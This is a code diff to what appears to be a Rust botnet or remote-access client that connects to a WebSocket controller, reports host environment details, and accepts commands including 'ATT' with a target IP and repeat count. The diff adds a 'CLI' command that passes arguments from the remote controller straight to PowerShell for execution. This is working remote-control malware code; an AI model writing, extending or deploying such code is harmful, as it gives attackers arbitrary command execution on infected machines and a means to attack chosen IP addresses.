@@ -19,6 +19,7 @@ enum CMD{
     C_ICON,
     R_ICON,
     SEND,
+    CLI(Vec<String>),
     ATT(String,u16),
 }
 impl From<&str> for CMD{
@@ -30,6 +31,7 @@ impl From<&str> for CMD{
             "C_ICON"=>CMD::C_ICON,
             "R_ICON"=>CMD::R_ICON,
             "SEND"=>CMD::SEND,
+            "CLI"=>CMD::CLI(Vec::new()),
             "ATT"=>CMD::ATT(String::new(),0),
             _ => CMD::SLEEP
         }
@@ -44,6 +46,7 @@ impl ToString for CMD{
             CMD::C_ICON=>String::from("C_ICON"),
             CMD::R_ICON=>String::from("R_ICON"),
             CMD::SEND=>String::from("SEND"),
+            CMD::CLI(_)=>String::from("CLI"),
             CMD::ATT(_,_)=>String::from("ATT"),
         }
     }
@@ -55,9 +58,12 @@ struct CommandJson{
 
 #[derive(Debug,Deserialize)]
 struct AttJson{
-    cmd:String,
     ip:String,
     times:u16,    
+}
+#[derive(Debug,Deserialize)]
+struct CliJson{
+    args:Vec<String>,    
 }
 
 static EVENT:Mutex<String> =Mutex::new(String::new());
@@ -97,7 +103,7 @@ async fn main() {
                 println!("* {}", header);
             }
         
-            socket.write_message(Message::Text("Hello WebSocket".into())).unwrap();
+            socket.write_message(Message::Text("->".into())).unwrap();
             let tx_sender = cmd_sender.clone();
             let ws_sender = cmd_sender.clone();
             tokio::spawn(async move{
@@ -110,6 +116,10 @@ async fn main() {
                     if ws_cmd.to_string() == "ATT"{
                         let cmd_json:AttJson = serde_json::from_str(msg.to_string().as_str()).unwrap();
                         ws_sender.send(CMD::ATT(cmd_json.ip,cmd_json.times)).await.unwrap();
+                    }else if ws_cmd.to_string() == "CLI"{
+                        let cmd_json:CliJson = serde_json::from_str(msg.to_string().as_str()).unwrap();
+                        ws_sender.send(CMD::CLI(cmd_json.args)).await.unwrap();
+
                     }
                     ws_sender.send(ws_cmd).await.unwrap();
 
@@ -211,6 +221,16 @@ async fn main() {
                         }
                         tx_sender.send(CMD::SLEEP).await.unwrap();
                     }
+                    CMD::CLI(args)=>{
+                        let output = Command::new("powershell")
+                            .args(args)
+                            .output();
+                        if output.is_err(){
+                            tx_sender.send(CMD::SLEEP).await.unwrap();
+                        }
+                        tx_sender.send(CMD::SLEEP).await.unwrap();
+
+                    }
                 }
             }
         }
@@ -308,7 +328,7 @@ fn get_env(key:&str)->String{
     i.unwrap()
     
 }
-#[derive(Serialize,Deserialize)]
+#[derive(Debug,Serialize)]
 struct EnvInformation{
     os:String,
     number_of_processors:String,
